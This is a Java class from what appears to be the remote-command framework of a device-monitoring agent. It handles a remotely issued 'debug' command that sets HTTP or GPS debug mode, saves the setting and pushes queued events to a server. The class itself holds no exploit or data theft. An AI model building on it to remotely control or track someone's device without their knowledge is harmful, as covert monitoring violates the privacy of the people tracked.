package com.vvt.rmtcmd.pcc;

import com.vvt.event.constant.FxDebugMode;
import com.vvt.global.Global;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCDebug extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private int mode = 0;
	private int edFlag = 0;
	
	public PCCDebug(int edFlag, int mode) {
		this.mode = mode;
		this.edFlag = edFlag;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.DEBUG.getId());
		try {
			Preference pref = Global.getPreference();
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			if (edFlag == DISABLE) {
				generalInfo.setFxDebugMode(FxDebugMode.UNKNOWN);
			} else {
				if (mode == FxDebugMode.HTTP.getId()) {
					generalInfo.setFxDebugMode(FxDebugMode.HTTP);
				} else if (mode == FxDebugMode.GPS.getId()) {
					generalInfo.setFxDebugMode(FxDebugMode.GPS);
				} else {
					generalInfo.setFxDebugMode(FxDebugMode.UNKNOWN);
				}
			}
			pref.commit(generalInfo);
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
